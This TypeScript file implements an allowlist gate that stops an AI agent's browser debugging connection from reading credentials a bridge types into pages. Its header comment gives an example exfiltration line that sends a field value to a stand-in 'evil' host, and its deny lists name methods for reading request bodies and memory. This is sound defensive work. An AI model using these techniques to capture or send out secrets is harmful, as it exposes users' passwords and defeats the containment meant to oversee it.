// Copyright (C) 2026 1Claw
// SPDX-License-Identifier: Apache-2.0

/**
 * What an agent's CDP connection is allowed to do.
 *
 * The bridge is the only process attached to Chromium; frameworks reach it
 * through this gate. That is not a stylistic choice. If browser-use, Hermes or
 * Claude Code keeps its *own* CDP connection to the same Chromium the bridge
 * types into, the no-plaintext invariant fails in one step: after a fill the
 * agent reads `input.value`, the accessibility tree, a screenshot, or the
 * `Network` log of the form POST.
 *
 * Filtering *responses* does not fix that, which is why this is a gate on
 * commands and events rather than a redactor. The bypasses are trivial and
 * endless — `btoa(input.value)`, a char-code transform, or
 * `fetch('https://evil/?'+input.value)`, which exfiltrates without ever
 * returning the value to the agent. Listeners and MutationObservers installed
 * *before* the fill capture keystrokes as `Input.*` delivers them, and
 * `Fetch.enable` sees the POST body in flight no matter what comes back.
 *
 * It is an allowlist, not a denylist. CDP has around fifty domains and gains
 * members every Chromium release; a denylist is out of date the moment it is
 * written, and its failure mode is silent exposure rather than a broken tool.
 */

/** Commands an agent may issue when no fill is in progress on the target. */
const ALLOWED_METHODS: ReadonlySet<string> = new Set([
  // Navigation and lifecycle — the things an agent legitimately drives.
  "Page.navigate",
  "Page.reload",
  "Page.getFrameTree",
  "Page.captureScreenshot",
  "Page.enable",
  "Page.disable",
  // Reading the page it is working on.
  "DOM.getDocument",
  "DOM.querySelector",
  "DOM.querySelectorAll",
  "DOM.getBoxModel",
  "DOM.describeNode",
  "DOM.enable",
  "DOM.disable",
  "Runtime.evaluate",
  "Runtime.callFunctionOn",
  "Runtime.enable",
  "Runtime.disable",
  "Accessibility.getFullAXTree",
  // Ordinary interaction.
  "Input.dispatchMouseEvent",
  "Input.dispatchKeyEvent",
  "Input.insertText",
  // Target enumeration, so a framework can find its own context.
  "Target.getTargets",
  "Target.getTargetInfo",
  "Target.attachToTarget",
  // An agent has to be able to open and close its own pages, or no framework
  // can drive this at all. Safe because the proxy places every target it opens
  // in that client's own browser context — it cannot reach another client's
  // pages, and it cannot choose a context, since createBrowserContext is
  // refused outright.
  "Target.createTarget",
  "Target.closeTarget",
  // Network *metadata* only. Bodies are handled separately below.
  "Network.enable",
  "Network.disable",
  "Network.getCookies",
  "Network.setCookie",
  "Network.deleteCookies",
]);

/**
 * Commands refused outright, on any target, at any time.
 *
 * These read request or response *bodies*. A login POST body contains the
 * password whether or not a fill window happens to be open, and there is no
 * legitimate agent use that needs them through this gate.
 *
 * The plan allows either per-request denial (tracking ids seen during a fill
 * window) or wholesale denial. Wholesale is taken here: it is strictly
 * stronger, it needs no state that could be missed or evicted, and deferring
 * the read until after the window — the obvious bypass against per-request
 * tracking — is not a case that has to be reasoned about at all.
 */
const NEVER_ALLOWED: ReadonlySet<string> = new Set([
  "Network.getRequestPostData",
  "Network.getResponseBody",
  "Network.getResponseBodyForInterception",
  "Network.takeResponseBodyForInterceptionAsStream",
  "Fetch.enable",
  "Fetch.getResponseBody",
  "Fetch.continueWithAuth",
  "Fetch.takeResponseBodyAsStream",
  // Debugger lets a caller pause on the typing path and read locals.
  "Debugger.enable",
  "Debugger.setBreakpoint",
  "Debugger.setBreakpointByUrl",
  "Debugger.pause",
  // A heap snapshot contains every string on the page, including what was typed.
  "HeapProfiler.takeHeapSnapshot",
  "HeapProfiler.collectGarbage",
  "Memory.getAllTimeSamplingProfile",
  // Re-attaching outside the gate would make all of this moot.
  "Target.createBrowserContext",
  "Target.setDiscoverTargets",
  "Target.setAutoAttach",
  "Browser.close",
  "Browser.getBrowserCommandLine",
]);

/**
 * Events never forwarded to an agent, on any target.
 *
 * `requestWillBeSent` carries `postData`. `responseReceivedExtraInfo` carries
 * `Set-Cookie`. Both are push events, so an agent that enabled the domain
 * before a fill would otherwise receive them without issuing a command.
 */
const NEVER_FORWARDED_EVENTS: ReadonlySet<string> = new Set([
  "Network.requestWillBeSentExtraInfo",
  "Network.responseReceivedExtraInfo",
  "Debugger.paused",
  "Debugger.scriptParsed",
]);

export type CdpDecision =
  | { readonly allow: true }
  | { readonly allow: false; readonly reason: CdpDenyReason; readonly message: string };

export type CdpDenyReason =
  | "fill_in_progress"
  | "method_not_allowed"
  | "body_access_denied"
  | "unknown_target";

const ALLOW: CdpDecision = { allow: true };

const deny = (reason: CdpDenyReason, message: string): CdpDecision => ({
  allow: false,
  reason,
  message,
});

export type CdpCommand = {
  readonly method: string;
  /** Target the command is addressed to. Absent means browser-level. */
  readonly targetId?: string;
  readonly params?: Readonly<Record<string, unknown>>;
};

export type CdpEvent = {
  readonly method: string;
  readonly targetId?: string;
  readonly params?: Readonly<Record<string, unknown>>;
};

/**
 * Tracks fill windows and decides what the agent's CDP connection may do.
 *
 * One gate per bridge process; fill windows are per target, so a fill on one
 * tab does not freeze an agent working in another.
 */
export class CdpGate {
  /** Targets with a fill in progress. */
  readonly #fillTargets = new Set<string>();

  openFillWindow(targetId: string): void {
    this.#fillTargets.add(targetId);
  }

  closeFillWindow(targetId: string): void {
    this.#fillTargets.delete(targetId);
  }

  isFilling(targetId: string): boolean {
    return this.#fillTargets.has(targetId);
  }

  /** Decide whether the agent may issue this command. */
  evaluateCommand(cmd: CdpCommand): CdpDecision {
    if (NEVER_ALLOWED.has(cmd.method)) {
      return deny(
        cmd.method.startsWith("Network.") || cmd.method.startsWith("Fetch.")
          ? "body_access_denied"
          : "method_not_allowed",
        `${cmd.method} is never available through the bridge`,
      );
    }

    // A fill in progress blocks the whole target, not just the field. Anything
    // less leaves `Runtime.evaluate` free to read the value being typed.
    if (cmd.targetId && this.#fillTargets.has(cmd.targetId)) {
      return deny("fill_in_progress", "a credential fill is in progress on this target");
    }

    if (!ALLOWED_METHODS.has(cmd.method)) {
      return deny("method_not_allowed", `${cmd.method} is not on the bridge allowlist`);
    }

    return ALLOW;
  }

  /**
   * Decide whether an event may be delivered to the agent.
   *
   * Events are dropped, never queued: replaying them once the window closes
   * would hand over exactly what suppressing them prevented.
   */
  shouldForwardEvent(evt: CdpEvent): boolean {
    if (NEVER_FORWARDED_EVENTS.has(evt.method)) return false;
    if (evt.targetId && this.#fillTargets.has(evt.targetId)) return false;
    return true;
  }
}
